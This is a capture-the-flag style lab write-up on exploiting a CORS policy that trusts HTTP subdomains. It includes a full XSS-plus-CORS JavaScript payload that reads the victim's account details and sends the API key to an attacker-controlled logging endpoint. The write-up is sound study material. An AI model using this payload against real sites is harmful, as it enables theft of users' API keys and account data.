# CORS vulnerability with trusted insecure protocols
* THis website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
	* To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you succcessfully submit the administrator's API key.
	* You can log in your own account using the following credentials `wiener:peter`
		* If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hajack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration.

### 1. Enumerate the Website
* Log in as Wiener and enumerte the request and response.
	* From /accountDetails, the API key can be found.

* Also the response contains Access-Control-Allow-Credentials, which mean that the site may support CORS.
### 2. Send the request to Burp and submit it with the added header 
* Add the header `Origin: http://subdomain.ac441fc91e510698c0494ccf009f00cf.web-security-academy.net`.

* From the result, the CORS configuration allows access from arbitrarty subdomains, both http and HTTPS.
### 3. Find a subdoamin that ise vulnerable to XSS
* From the stock checking functionality, a possible vulnerable parameter "productID" is found

### 3. At the exploit server, Make a malicious HTML file to obtain Adminitstrator's API key
* Inject a vulnerable JavaScript exploit between the two parameters "productId" and "storeId"
```html
<script>
    document.location="http://stock.ac441fc91e510698c0494ccf009f00cf.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac441fc91e510698c0494ccf009f00cf.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-acdb1f8c1e1006e6c03e4c80011a001a.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

* Store the exploit and click "Deliver exploit to victim" to send the exploit.
	* As a result, some information about "Administrator" is given.

* By submitting Administrator's API key, the lab is solved.
